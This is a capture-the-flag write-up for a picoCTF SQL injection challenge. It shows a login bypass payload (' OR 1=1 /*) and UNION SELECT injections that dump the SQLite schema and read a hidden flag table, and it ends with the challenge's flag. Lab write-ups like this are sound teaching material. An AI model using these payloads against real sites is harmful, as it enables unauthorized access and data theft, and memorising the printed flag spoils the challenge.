# SQLi
When we open the website we are presented with this login page

<img width="373" alt="image" src="https://github.com/sesiliafenina/CTFs/assets/44059409/0862e239-6ee9-4d65-a671-6353f56a0247">

If we enter a random username and password, we get the following:

<img width="617" alt="Pasted Graphic" src="https://github.com/sesiliafenina/CTFs/assets/44059409/0924ab13-1f24-4d9b-88fb-e93bcc890c80">

From here we know that we can use the most basic SQL injection on the password field. So we use:
```
' OR 1=1 /*
```

After that we will be logged in and we will be presented with another table. The Kampala city looks interesting.

<img width="606" alt="Pasted Graphic 1" src="https://github.com/sesiliafenina/CTFs/assets/44059409/437f0030-f276-4423-a041-233f0b078da4">

The search bar itself might be passing inputs directly to an SQL query so I tried to do a UNION SELECT to see if there is any other tables (based on the hints written in Kampala’s address)
```
Kampala' UNION SELECT tbl_name, name, sql FROM sqlite_master;
```

And sure enough we get to dump all the tables. The more_table seems to have the flag we are looking for so let’s try to query that table.

<img width="598" alt="Pasted Graphic 2" src="https://github.com/sesiliafenina/CTFs/assets/44059409/c28bef50-df73-4531-bcb2-4fffd94c956e">

```
Kampala' UNION SELECT flag, flag, flag FROM more_table WHERE id = '1';
```

<img width="599" alt="Pasted Graphic 3" src="https://github.com/sesiliafenina/CTFs/assets/44059409/15949922-6b7f-453e-9078-779b4de8525e">


And we get our flag:
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8ee9477}
```
